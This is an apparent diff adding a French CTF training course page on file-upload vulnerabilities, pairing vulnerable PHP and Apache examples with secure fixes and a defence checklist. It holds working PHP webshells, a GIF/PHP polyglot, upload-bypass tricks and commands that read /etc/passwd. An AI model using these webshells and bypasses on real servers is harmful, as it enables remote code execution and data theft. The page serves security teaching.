@@ -1,0 +1,587 @@
+{% extends "base.html" %}
+{% block title %}Cours : Upload de Fichiers - CyberCampus CTF{% endblock %}
+
+{% block content %}
+<section class="page-wrapper course-page">
+  
+  <!-- Breadcrumb -->
+  <div class="breadcrumb">
+    <a href="{{ url_for('learn') }}">📚 Bibliothèque</a>
+    <span class="separator">/</span>
+    <span class="current">Upload de Fichiers</span>
+  </div>
+
+  <!-- En-tête du cours -->
+  <div class="course-header">
+    <div class="course-header-icon">📤</div>
+    <div class="course-header-content">
+      <h1>Vulnérabilités d'Upload de Fichiers</h1>
+      <p class="course-subtitle">Exploiter les failles de validation pour exécuter du code sur le serveur</p>
+      <div class="course-badges">
+        <span class="badge-info">Web Exploitation</span>
+        <span class="badge-time">📖 15 min</span>
+        <span class="badge-level">⚡ Intermédiaire</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Contenu du cours -->
+  <div class="course-content">
+
+    <!-- Section 1 -->
+    <div class="course-section">
+      <h2>📤 Introduction aux vulnérabilités d'upload</h2>
+      <p>
+        L'<strong>upload de fichiers</strong> est une fonctionnalité courante permettant aux utilisateurs de télécharger 
+        des documents, images, vidéos sur une application web. Cependant, lorsqu'elle est mal implémentée, cette 
+        fonctionnalité peut devenir l'une des <strong>vulnérabilités les plus critiques</strong> d'une application.
+      </p>
+      <p>
+        Un attaquant peut exploiter une mauvaise validation pour uploader un <strong>webshell</strong> (script malveillant) 
+        et obtenir l'exécution de code à distance (RCE - Remote Code Execution) sur le serveur, compromettant ainsi 
+        totalement l'application et ses données.
+      </p>
+      
+      <div class="info-box">
+        <div class="info-icon">⚠️</div>
+        <div class="info-content">
+          <strong>Impact critique :</strong>
+          <p>Une vulnérabilité d'upload peut permettre à un attaquant de voler des données sensibles, créer des backdoors, 
+          déployer des ransomwares, ou prendre le contrôle total du serveur.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Section 2 -->
+    <div class="course-section">
+      <h2>🎯 Scénario d'attaque typique</h2>
+      <p>Voici comment un attaquant exploite une faille d'upload en 5 étapes :</p>
+
+      <div class="protection-method">
+        <div class="method-number">1</div>
+        <div class="method-content">
+          <h3>Reconnaissance</h3>
+          <p>L'attaquant identifie un formulaire d'upload (avatar, document, CV, etc.)</p>
+        </div>
+      </div>
+
+      <div class="protection-method">
+        <div class="method-number">2</div>
+        <div class="method-content">
+          <h3>Test de validation</h3>
+          <p>Il teste quelles extensions et types de fichiers sont acceptés</p>
+        </div>
+      </div>
+
+      <div class="protection-method">
+        <div class="method-number">3</div>
+        <div class="method-content">
+          <h3>Bypass des protections</h3>
+          <p>Il contourne les validations faibles (double extension, Content-Type, etc.)</p>
+        </div>
+      </div>
+
+      <div class="protection-method">
+        <div class="method-number">4</div>
+        <div class="method-content">
+          <h3>Upload du webshell</h3>
+          <p>Il upload un fichier malveillant contenant du code exécutable</p>
+        </div>
+      </div>
+
+      <div class="protection-method">
+        <div class="method-number">5</div>
+        <div class="method-content">
+          <h3>Exécution et compromission</h3>
+          <p>Il accède au fichier uploadé et exécute des commandes système</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Section 3 -->
+    <div class="course-section">
+      <h2>🔓 Types d'upload vulnérables</h2>
+      <p>Les vulnérabilités varient selon le langage et le serveur web utilisé :</p>
+
+      <div class="attack-types">
+        <div class="attack-type-card">
+          <h4>🐘 PHP (Apache/Nginx)</h4>
+          <p>Extensions : .php, .phtml, .php3, .php5, .php7</p>
+          <p><strong>Serveurs :</strong> Apache, Nginx avec PHP-FPM</p>
+        </div>
+        <div class="attack-type-card">
+          <h4>🪟 ASP/ASPX (IIS)</h4>
+          <p>Extensions : .asp, .aspx, .ashx, .cer, .asa</p>
+          <p><strong>Serveur :</strong> Microsoft IIS (Windows)</p>
+        </div>
+        <div class="attack-type-card">
+          <h4>☕ JSP (Java)</h4>
+          <p>Extensions : .jsp, .jspx, .war</p>
+          <p><strong>Serveurs :</strong> Tomcat, JBoss, WebLogic</p>
+        </div>
+        <div class="attack-type-card">
+          <h4>🔺 Autres langages</h4>
+          <p>Python (.py), Perl (.pl), Ruby (.rb)</p>
+          <p>Tout dépend de la configuration serveur !</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Section 4 -->
+    <div class="course-section">
+      <h2>💉 Exploitation PHP : L'exemple classique</h2>
+      <p>Le PHP reste le vecteur d'attaque le plus courant. Voici un code vulnérable typique :</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-status">⚠️ Code PHP vulnérable</span>
+          <span class="code-lang">PHP</span>
+        </div>
+        <pre><code>&lt;?php
+// ❌ MAUVAISE PRATIQUE - Validation insuffisante
+$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
+$fileName = $_FILES['avatar']['name'];
+$fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
+
+if (in_array($fileExtension, $allowedExtensions)) {
+    move_uploaded_file($_FILES['avatar']['tmp_name'], 
+                      'uploads/' . $fileName);
+    echo "Avatar uploadé avec succès !";
+}
+?&gt;</code></pre>
+      </div>
+
+      <div class="explanation-box">
+        <h4>Problèmes de ce code :</h4>
+        <ul>
+          <li>✗ Validation uniquement sur l'extension déclarée dans le nom</li>
+          <li>✗ Pas de vérification du contenu réel du fichier (MIME type)</li>
+          <li>✗ Accepte les double extensions comme <code>shell.php.jpg</code></li>
+          <li>✗ Ne vérifie pas les extensions alternatives PHP (.phtml, .php3, etc.)</li>
+          <li>✗ Stockage dans un répertoire accessible publiquement</li>
+        </ul>
+      </div>
+
+      <h3>Méthodes d'exploitation</h3>
+
+      <div class="attack-showcase">
+        <div class="attack-input">
+          <label>Méthode 1 : Double extension</label>
+          <div class="code-block" style="margin-top: 0.5rem;">
+            <pre><code># Créer un webshell
+echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php.jpg
+
+# Le fichier se termine par .jpg mais contient du PHP
+# Si .htaccess permet l'exécution, Apache exécutera le PHP</code></pre>
+          </div>
+        </div>
+        <div class="attack-output">
+          <label>Résultat</label>
+          <div class="code-block" style="margin-top: 0.5rem;">
+            <pre><code>✅ Avatar uploadé avec succès : shell.php.jpg
+
+# Accéder au webshell :
+http://target.com/uploads/shell.php.jpg?cmd=whoami
+# Output: www-data
+
+http://target.com/uploads/shell.php.jpg?cmd=cat%20/flag.txt
+# Output: CTF{Upl04d_PHP_Sh3ll_M4st3r}</code></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="attack-showcase">
+        <div class="attack-input">
+          <label>Méthode 2 : Extension alternative</label>
+          <div class="code-block" style="margin-top: 0.5rem;">
+            <pre><code># Utiliser .phtml au lieu de .php
+&lt;?php
+echo shell_exec($_GET['cmd']);
+?&gt;
+
+# Sauvegarder comme avatar.phtml</code></pre>
+          </div>
+        </div>
+        <div class="attack-output">
+          <label>Extensions PHP à tester</label>
+          <ul style="margin-top: 0.5rem;">
+            <li>.php, .php3, .php4, .php5, .php7</li>
+            <li>.phtml, .pht</li>
+            <li>.phps (code source PHP)</li>
+            <li>.phar (archives PHP)</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="attack-showcase">
+        <div class="attack-input">
+          <label>Méthode 3 : Fichier polyglotte (GIF + PHP)</label>
+          <div class="code-block" style="margin-top: 0.5rem;">
+            <pre><code>GIF89a;
+&lt;?php system($_GET['cmd']); ?&gt;
+
+# Ce fichier est à la fois :
+# - Une image GIF valide (commence par GIF89a)
+# - Du code PHP exécutable</code></pre>
+          </div>
+        </div>
+        <div class="attack-output">
+          <label>Avantages</label>
+          <ul style="margin-top: 0.5rem;">
+            <li>✓ Passe la validation de signature GIF</li>
+            <li>✓ Passe les vérifications MIME type</li>
+            <li>✓ S'exécute si PHP est activé</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="success-box">
+        <strong>💡 Astuce Pro :</strong> Utilisez Burp Suite pour intercepter la requête d'upload et modifier 
+        le nom du fichier ou le Content-Type à la volée !
+      </div>
+    </div>
+
+    <!-- Section 5 -->
+    <div class="course-section">
+      <h2>🕸️ Configuration Apache vulnérable</h2>
+      <p>Souvent, la vulnérabilité ne vient pas seulement du code PHP, mais aussi de la configuration serveur :</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-status">⚠️ .htaccess dangereux</span>
+          <span class="code-lang">Apache</span>
+        </div>
+        <pre><code># ❌ MAUVAISE CONFIGURATION
+&lt;FilesMatch "\.php"&gt;
+    SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;
+
+# Ce regex matche n'importe quel fichier contenant .php
+# Donc shell.php.jpg sera exécuté comme du PHP !</code></pre>
+      </div>
+
+      <div class="explanation-box">
+        <h4>Pourquoi c'est dangereux ?</h4>
+        <p>
+          Le <code>FilesMatch</code> utilise une regex qui matche <strong>tout fichier contenant .php</strong> dans son nom.
+          Ainsi, <code>shell.php.jpg</code>, <code>avatar.php.png</code>, ou même <code>image.php_backup</code> seront 
+          traités comme du code PHP exécutable.
+        </p>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-status">✅ Configuration sécurisée</span>
+          <span class="code-lang">Apache</span>
+        </div>
+        <pre><code># ✅ BONNE CONFIGURATION
+&lt;FilesMatch "\.(php|php3|php4|php5|phtml)$"&gt;
+    SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;
+
+# Le $ force la correspondance en FIN de nom
+# Seuls les fichiers SE TERMINANT par .php seront exécutés
+
+# Ou mieux encore, désactiver complètement PHP :
+php_flag engine off</code></pre>
+      </div>
+    </div>
+
+    <!-- Section 6 -->
+    <div class="course-section">
+      <h2>🚀 Webshells avancés</h2>
+      <p>Une fois l'upload réussi, les attaquants utilisent des webshells sophistiqués :</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-status">🐚 Webshell PHP minimaliste</span>
+          <span class="code-lang">PHP</span>
+        </div>
+        <pre><code>&lt;?php
+// Webshell discret en une ligne
+if(isset($_GET['c'])) {
+    echo "&lt;pre&gt;" . shell_exec($_GET['c']) . "&lt;/pre&gt;";
+}
+?&gt;
+
+// Utilisation :
+// http://target.com/shell.php?c=ls -la
+// http://target.com/shell.php?c=cat /etc/passwd</code></pre>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-status">🐚 Webshell avec upload de fichiers</span>
+          <span class="code-lang">PHP</span>
+        </div>
+        <pre><code>&lt;?php
+// Exécution de commandes
+if(isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+
+// Upload de fichiers supplémentaires
+if(isset($_FILES['f'])) {
+    move_uploaded_file($_FILES['f']['tmp_name'], 
+                       $_FILES['f']['name']);
+    echo "File uploaded: " . $_FILES['f']['name'];
+}
+?&gt;
+
+// Permet d'uploader d'autres outils malveillants</code></pre>
+      </div>
+
+      <div class="info-box" style="background: #fff3cd; border-color: #ffc107;">
+        <div class="info-icon">🛡️</div>
+        <div class="info-content">
+          <strong>Défense :</strong>
+          <p>Les webshells populaires (c99, r57, b374k, WSO) sont souvent détectés par les antivirus et WAF. 
+          Les attaquants créent donc des versions obfusquées ou utilisent des techniques d'encodage.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Section 7 -->
+    <div class="course-section">
+      <h2>🎭 Techniques de bypass avancées</h2>
+      <p>Les applications modernes ont souvent des protections. Voici comment les contourner :</p>
+
+      <div class="attack-types">
+        <div class="attack-type-card">
+          <h4>1️⃣ Bypass Content-Type</h4>
+          <p>Intercepter la requête avec Burp Suite et changer :</p>
+          <div class="code-block" style="margin-top: 0.5rem; font-size: 0.85rem;">
+            <pre><code>Content-Type: image/jpeg
+↓
+Content-Type: application/x-php</code></pre>
+          </div>
+        </div>
+
+        <div class="attack-type-card">
+          <h4>2️⃣ Caractères nuls</h4>
+          <p>Exploiter les bugs de parsing (PHP &lt; 5.3.4) :</p>
+          <div class="code-block" style="margin-top: 0.5rem; font-size: 0.85rem;">
+            <pre><code>shell.php%00.jpg
+# Enregistré comme shell.php</code></pre>
+          </div>
+        </div>
+
+        <div class="attack-type-card">
+          <h4>3️⃣ Unicode lookalikes</h4>
+          <p>Utiliser des caractères visuellement similaires :</p>
+          <div class="code-block" style="margin-top: 0.5rem; font-size: 0.85rem;">
+            <pre><code>shell.рһр
+# 'р' cyrillique au lieu de 'p'</code></pre>
+          </div>
+        </div>
+
+        <div class="attack-type-card">
+          <h4>4️⃣ Race Condition</h4>
+          <p>Si l'app valide puis supprime :</p>
+          <div class="code-block" style="margin-top: 0.5rem; font-size: 0.85rem;">
+            <pre><code>while true; do
+  curl upload.php &
+  curl shell.php &
+done</code></pre>
+          </div>
+        </div>
+
+        <div class="attack-type-card">
+          <h4>5️⃣ Archives compressées</h4>
+          <p>Si l'app décompresse automatiquement :</p>
+          <div class="code-block" style="margin-top: 0.5rem; font-size: 0.85rem;">
+            <pre><code>zip shell.zip shell.php
+# Upload du ZIP</code></pre>
+          </div>
+        </div>
+
+        <div class="attack-type-card">
+          <h4>6️⃣ Validation côté client</h4>
+          <p>JavaScript facilement bypassé :</p>
+          <div class="code-block" style="margin-top: 0.5rem; font-size: 0.85rem;">
+            <pre><code># Désactiver JS
+# Ou utiliser curl directement</code></pre>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Section 8 -->
+    <div class="course-section">
+      <h2>🛡️ Défenses et protections</h2>
+      <p>Comment sécuriser une fonctionnalité d'upload ? Voici les bonnes pratiques :</p>
+
+      <div class="checklist">
+        <div class="checklist-item">
+          <span class="check">✅</span>
+          <span><strong>Whitelist d'extensions</strong> stricte (jamais de blacklist)</span>
+        </div>
+        <div class="checklist-item">
+          <span class="check">✅</span>
+          <span><strong>Validation du contenu réel</strong> via magic bytes (MIME type)</span>
+        </div>
+        <div class="checklist-item">
+          <span class="check">✅</span>
+          <span><strong>Renommage aléatoire</strong> des fichiers uploadés</span>
+        </div>
+        <div class="checklist-item">
+          <span class="check">✅</span>
+          <span><strong>Stockage hors du webroot</strong> si possible</span>
+        </div>
+        <div class="checklist-item">
+          <span class="check">✅</span>
+          <span><strong>Désactivation de l'exécution</strong> dans le dossier uploads</span>
+        </div>
+        <div class="checklist-item">
+          <span class="check">✅</span>
+          <span><strong>Limitation de taille</strong> des fichiers</span>
+        </div>
+        <div class="checklist-item">
+          <span class="check">✅</span>
+          <span><strong>Scan antivirus</strong> des fichiers uploadés</span>
+        </div>
+        <div class="checklist-item">
+          <span class="check">✅</span>
+          <span><strong>Permissions restrictives</strong> (644, jamais 777)</span>
+        </div>
+        <div class="checklist-item">
+          <span class="check">✅</span>
+          <span><strong>Authentification requise</strong> pour uploader</span>
+        </div>
+        <div class="checklist-item">
+          <span class="check">✅</span>
+          <span><strong>Logging et monitoring</strong> des uploads suspects</span>
+        </div>
+      </div>
+
+      <h3>Code PHP sécurisé</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-status">✅ Validation robuste</span>
+          <span class="code-lang">PHP</span>
+        </div>
+        <pre><code>&lt;?php
+// ✅ BONNES PRATIQUES
+
+// 1. Whitelist stricte
+$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
+$fileName = $_FILES['file']['name'];
+
+// 2. Vérifier TOUTES les extensions (double extension)
+$allExtensions = explode('.', $fileName);
+foreach ($allExtensions as $ext) {
+    if (!in_array(strtolower($ext), $allowedExtensions)) {
+        die("Extension non autorisée");
+    }
+}
+
+// 3. Vérifier le contenu réel (magic bytes)
+$finfo = finfo_open(FILEINFO_MIME_TYPE);
+$mimeType = finfo_file($finfo, $_FILES['file']['tmp_name']);
+$allowedMimes = ['image/jpeg', 'image/png', 'image/gif'];
+if (!in_array($mimeType, $allowedMimes)) {
+    die("Type de fichier invalide");
+}
+finfo_close($finfo);
+
+// 4. Renommer avec nom aléatoire
+$newName = bin2hex(random_bytes(16)) . '.jpg';
+$uploadDir = '/var/data/uploads/'; // HORS du webroot
+
+// 5. Déplacer avec permissions restrictives
+move_uploaded_file($_FILES['file']['tmp_name'], $uploadDir . $newName);
+chmod($uploadDir . $newName, 0644);
+
+echo "Fichier uploadé en sécurité : " . $newName;
+?&gt;</code></pre>
+      </div>
+
+      <div class="success-box">
+        <strong>🎯 Principe de défense en profondeur :</strong>
+        Ne vous reposez jamais sur une seule protection. Combinez plusieurs couches de sécurité 
+        pour rendre l'exploitation impossible même si une défense est contournée.
+      </div>
+    </div>
+
+    <!-- Section 9 -->
+    <div class="course-section">
+      <h2>🔨 Outils d'exploitation</h2>
+      <p>Les outils utilisés par les pentesters pour tester les uploads :</p>
+
+      <div class="explanation-box">
+        <h4>Outils essentiels :</h4>
+        <ul>
+          <li><strong>Burp Suite :</strong> Intercepter et modifier les requêtes HTTP</li>
+          <li><strong>OWASP ZAP :</strong> Scanner automatique de vulnérabilités</li>
+          <li><strong>ffuf / wfuzz :</strong> Fuzzing d'extensions et bypass</li>
+          <li><strong>ExifTool :</strong> Manipulation de métadonnées</li>
+          <li><strong>file / hexdump :</strong> Analyser les magic bytes</li>
+        </ul>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-status">🔍 Commandes utiles</span>
+          <span class="code-lang">Bash</span>
+        </div>
+        <pre><code># Identifier le type réel d'un fichier
+file suspicious.jpg
+
+# Examiner les magic bytes
+hexdump -C file.jpg | head
+
+# Fuzzing d'extensions avec ffuf
+ffuf -u http://target.com/upload.php \
+     -w extensions.txt \
+     -X POST \
+     -H "Content-Type: multipart/form-data" \
+     -mc 200
+
+# Scanner pour webshells sur le serveur
+grep -r "system\|exec\|passthru\|shell_exec" /var/www/uploads/</code></pre>
+      </div>
+    </div>
+
+    <!-- CTA Challenge -->
+    <div class="challenge-cta">
+      <div class="cta-content">
+        <h2>🎯 Prêt à exploiter ?</h2>
+        <p>
+          Maintenant que vous maîtrisez les vulnérabilités d'upload, testez vos compétences sur un challenge réel !
+          Uploadez un webshell PHP, contournez les protections, et obtenez l'exécution de code à distance pour 
+          récupérer le flag caché sur le serveur.
+        </p>
+        <div class="cta-info">
+          <div class="cta-detail">
+            <span class="cta-icon">⭐</span>
+            <span><strong>200 points</strong></span>
+          </div>
+          <div class="cta-detail">
+            <span class="cta-icon">🎓</span>
+            <span>Niveau intermédiaire</span>
+          </div>
+          <div class="cta-detail">
+            <span class="cta-icon">⏱️</span>
+            <span>15 minutes</span>
+          </div>
+        </div>
+        <a href="{{ url_for('challenge_view', challenge_id=6) }}" class="btn challenge-btn-large">
+          Accéder au challenge Upload
+        </a>
+      </div>
+    </div>
+
+    <!-- Navigation -->
+    <div class="course-navigation">
+      <a href="{{ url_for('learn') }}" class="nav-btn back">
+        ← Retour à la bibliothèque
+      </a>
+      <a href="{{ url_for('learn_osint') }}" class="nav-btn next">
+        Cours suivant : OSINT →
+      </a>
+    </div>
+
+  </div>
+
+</section>
+{% endblock %}
